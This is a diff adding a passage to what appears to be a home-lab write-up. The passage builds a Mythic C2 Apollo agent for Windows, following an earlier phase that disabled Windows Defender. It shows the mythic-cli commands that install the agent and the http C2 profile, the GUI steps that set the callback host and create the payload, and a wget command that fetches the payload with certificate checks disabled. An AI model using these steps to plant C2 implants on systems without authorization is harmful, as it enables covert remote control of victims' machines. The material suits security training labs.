@@ -1025,4 +1025,57 @@ _In Phase 3, we will be disabling Windows Defender_
 _**Phase 3 Complete ; Beginning Phase 4, Execution**_
 We will be bulding our Mythic Agent.
 - Log into our Mythic web GUI from before.
-- 
+- Determine what Mythic agent we will be using for Windows. Gethub has a table showing what OS's wach agent can operate for.
+
+<img width="1386" height="922" alt="Screenshot 2026-04-19 132009" src="https://github.com/user-attachments/assets/4670b491-cc65-4249-8678-a1dbc13d024b" />
+
+- We will be using apllo.
+- You can scroll down the table to see it's capabilities as well (supporting http, smb, tcp, etc.).
+- Install our mythic agent ONTO our MYTHICServer we spun up recently:
+
+<img width="481" height="91" alt="Screenshot 2026-04-19 132628" src="https://github.com/user-attachments/assets/9573a3df-9be5-43ee-bea7-89856d57cedc" />
+
+For some reason I had to reinstall Mythic C2 service on the Mythic server
+
+<img width="967" height="832" alt="Screenshot 2026-04-19 134021" src="https://github.com/user-attachments/assets/87b52842-23d7-44e1-a118-6aa84021bff4" />
+
+- After that, attempting Apollo agent install (found in Gethub: https://github.com/MythicAgents/Apollo):
+- ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+
+_Mythic Agent Installed!_
+
+<img width="920" height="792" alt="Screenshot 2026-04-19 134326" src="https://github.com/user-attachments/assets/25120373-4a0c-4e34-bef2-682737a826ab" />
+<img width="1929" height="395" alt="Screenshot 2026-04-19 134602" src="https://github.com/user-attachments/assets/e0d0274c-cd54-4e04-b680-e2fe94a2a74e" />
+
+- Run this to install our C2 profile: ./mythic-cli install github https://github.com/MythicC2Profiles/http
+
+- We now have our agent AND C2 profile
+
+<img width="1237" height="317" alt="Screenshot 2026-04-19 135110" src="https://github.com/user-attachments/assets/64ceb834-793f-458a-8b0e-9626ff6be28d" />
+
+<img width="1779" height="799" alt="Screenshot 2026-04-19 135420" src="https://github.com/user-attachments/assets/0bbf1bd5-d76a-4e47-b364-0bcb149b7cf0" />
+
+click next
+
+<img width="1507" height="888" alt="Screenshot 2026-04-19 135611" src="https://github.com/user-attachments/assets/6c42c2df-97c5-4042-a88b-e9ed65f1c68e" />
+
+include profile and edit callback host to point to Mythic Server IP address. Have it use http. click next
+
+<img width="1629" height="829" alt="Screenshot 2026-04-19 135916" src="https://github.com/user-attachments/assets/fa86302a-b2e4-405f-925a-c7aa2be804d6" />
+
+Provide a name and description, then select Create Payload on bottom left of screen.
+
+<img width="920" height="174" alt="Screenshot 2026-04-19 140130" src="https://github.com/user-attachments/assets/f9f9968c-e099-46ad-9963-4c2da1ba545d" />
+
+Select Download here after payload is built
+
+<img width="765" height="106" alt="Screenshot 2026-04-19 140415" src="https://github.com/user-attachments/assets/49eb6ac6-b8b8-40ee-a85d-4d2d80a396e1" />
+
+- copy link address for download here instad of downloading in on our personal computer
+
+- tpe 'wget (our_payload_URL_wejustcopied) --no-check-certificate'
+
+- run the following to change our service host anme and directory. The license file number and your name will be different.
+
+<img width="1186" height="302" alt="Screenshot 2026-04-19 141613" src="https://github.com/user-attachments/assets/f96290bd-cf9d-4aca-bab2-eb71a7a612f4" />
+
